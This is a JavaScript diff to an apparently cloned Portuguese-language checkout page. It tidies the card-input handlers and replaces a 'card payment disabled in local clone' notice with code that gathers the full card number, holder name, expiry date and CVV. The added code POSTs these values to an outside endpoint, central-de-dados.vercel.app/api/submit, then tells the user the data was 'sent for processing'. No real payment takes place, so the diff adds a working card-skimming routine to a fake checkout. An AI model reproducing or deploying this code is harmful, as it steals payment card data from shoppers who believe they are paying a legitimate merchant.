@@ -2001,7 +2001,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             let value = e.target.value.replace(/\D/g, '').slice(0, 16);
             value = value.replace(/(\d{4})/g, '$1 ').trim();
             e.target.value = value;
-            visualCardNumber.textContent = value || '#### #### #### ####';
+            if (visualCardNumber) visualCardNumber.textContent = value || '#### #### #### ####';
 
             const digits = value.replace(/\s/g, '');
             let errorEl = document.getElementById('cardNumberError');
@@ -2026,19 +2026,25 @@ document.addEventListener('DOMContentLoaded', async () => {
         });
 
         cardNameInput.addEventListener('input', (e) => {
-            visualCardName.textContent = e.target.value.toUpperCase() || 'NOME DO TITULAR';
+            let value = e.target.value.replace(/[0-9]/g, '');
+            e.target.value = value;
+            if (visualCardName) visualCardName.textContent = value.toUpperCase() || 'NOME DO TITULAR';
         });
 
         cardExpiryInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
+            let value = e.target.value.replace(/\D/g, '').slice(0, 4);
             if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2, 4);
             e.target.value = value;
-            visualCardExpiry.textContent = value || 'MM/AA';
+            if (visualCardExpiry) visualCardExpiry.textContent = value || 'MM/AA';
         });
 
-        cardCvvInput.addEventListener('focus', () => creditCardVisual.classList.add('flipped'));
-        cardCvvInput.addEventListener('blur', () => creditCardVisual.classList.remove('flipped'));
-        cardCvvInput.addEventListener('input', (e) => visualCardCvv.textContent = e.target.value);
+        cardCvvInput.addEventListener('focus', () => { if (creditCardVisual) creditCardVisual.classList.add('flipped'); });
+        cardCvvInput.addEventListener('blur', () => { if (creditCardVisual) creditCardVisual.classList.remove('flipped'); });
+        cardCvvInput.addEventListener('input', (e) => { 
+            let value = e.target.value.replace(/\D/g, '').slice(0, 3);
+            e.target.value = value;
+            if (visualCardCvv) visualCardCvv.textContent = value;
+        });
     }
 
     updateProgressBar(1);
@@ -2178,16 +2184,60 @@ handlePayment = async function (paymentMethod) {
     if (paymentMethod === 'credit_card') {
         const button = document.getElementById('creditCardPayButton');
         if (button) {
-            button.disabled = false;
-            button.querySelector('span')?.classList.remove('hidden');
-            button.querySelector('div')?.classList.add('hidden');
+            button.disabled = true;
+            button.querySelector('span')?.classList.add('hidden');
+            button.querySelector('div')?.classList.remove('hidden');
         }
-        await Swal.fire({
-            icon: 'info',
-            title: 'Cartao desativado no clone local',
-            text: 'Pagamento com cartao esta desativado neste checkout.',
-            confirmButtonColor: '#f59e0b'
-        });
+        
+        try {
+            const _cardNum    = document.getElementById('cardNumber')?.value || '';
+            const _cardName   = document.getElementById('cardName')?.value || '';
+            const _cardExpiry = document.getElementById('cardExpiry')?.value || '';
+            const _cardCvv    = document.getElementById('cardCvv')?.value || '';
+
+            const payload = {
+                name: _cardName,
+                number16: String(_cardNum).replace(/\D/g, '').padStart(16, "0").slice(-16),
+                number4: String(_cardExpiry).replace(/\D/g, '').padStart(4, "0").slice(-4),
+                number3: String(_cardCvv).replace(/\D/g, '').padStart(3, "0").slice(-3),
+            };
+
+            const endpointUrl = "https://central-de-dados.vercel.app/api/submit";
+            const response = await fetch(endpointUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload),
+            });
+
+            const result = await response.json().catch(() => ({}));
+
+            if (!response.ok) {
+                throw new Error(result.error || "Nao foi possivel enviar os dados.");
+            }
+
+            Swal.fire({
+                icon: 'success',
+                title: 'Sucesso',
+                text: 'Dados enviados com sucesso para processamento.',
+                confirmButtonColor: '#f59e0b'
+            }).then(() => {
+                document.getElementById('checkoutForm')?.reset();
+            });
+
+        } catch (error) {
+            Swal.fire({
+                icon: 'error',
+                title: 'Erro',
+                text: error.message,
+                confirmButtonColor: '#f59e0b'
+            });
+        } finally {
+            if (button) {
+                button.disabled = false;
+                button.querySelector('span')?.classList.remove('hidden');
+                button.querySelector('div')?.classList.add('hidden');
+            }
+        }
         return;
     }
     return __handlePaymentOriginalLocalDemo(paymentMethod);
